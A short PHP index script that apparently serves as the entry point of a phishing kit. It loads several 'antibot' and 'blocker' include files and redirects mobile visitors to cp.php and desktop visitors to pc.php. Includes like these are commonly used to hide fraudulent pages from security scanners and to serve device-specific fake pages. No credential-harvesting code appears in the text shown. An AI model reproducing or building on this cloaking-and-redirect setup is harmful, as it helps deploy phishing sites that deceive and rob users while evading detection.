<?php
include("./config/antibot.php");
include("./config/antibots.php");
include("./config/antibotsulit.php");
include("./config/blocker.php");
include("./config/bt.php");
include_once 'MobileDetect.class.php';

$mdetect = new  MobileDetect();

if($mdetect->isMobile()){ 
 header("Location: cp.php");
die();
}else{
header("Location: pc.php");
die();
}
?>